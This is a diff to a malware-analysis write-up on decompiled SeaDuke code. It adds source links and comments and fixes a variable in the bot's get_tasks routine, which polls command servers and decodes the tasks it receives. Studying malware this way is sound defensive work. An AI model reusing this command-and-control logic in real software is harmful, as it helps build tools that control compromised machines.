@@ -23,9 +23,9 @@ class CryptoKlass(object):
 ```
 it then does three inner loops:
 ```python
-class NetworkHandlerKlass(object):
+class NetworkHandlerKlass(object):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1367
 
-    def get_tasks(self):
+    def get_tasks(self):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1476
         ...
         for _ in range(botKlass.total_hosts):
             for _ in range(botKlass.total_transports):
@@ -33,16 +33,16 @@ class NetworkHandlerKlass(object):
                     networkTasks=[]
                     try:
                         response_data = self.__send_request(id=botKlass.bot_id)
-                        decoded_response = self.decode_data(response_data)  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy renamed to decoded_response
+                        decoded_response = self.decode_data(response_data)  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy renamed to decoded_response, decoced response is a dict
                         if not 'tasks' in decoded_response:
                             return []
-                        decoded_tasks = decoded_data['tasks']  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD renamed to decoded_tasks
+                        decoded_tasks = decoded_response['tasks']
                         for networkTask in decoded_tasks:
                             if 'task_data' in networkTask and networkTask['task_data']:
                                 networkTask['task_data'] = my_cryptoklass.decode_data(networkTask['task_data'])
                                 networkTasks.append(networkTask)
                         botKlass.is_first_request=False
-                        return networkTasks
+                        return networkTasks  # a list of dict
 ```
 ## request information from remote server
 this is a critical part since it is where botKlass requests and receives instructions with `NetworkHandlerKlass.__send_request` method:
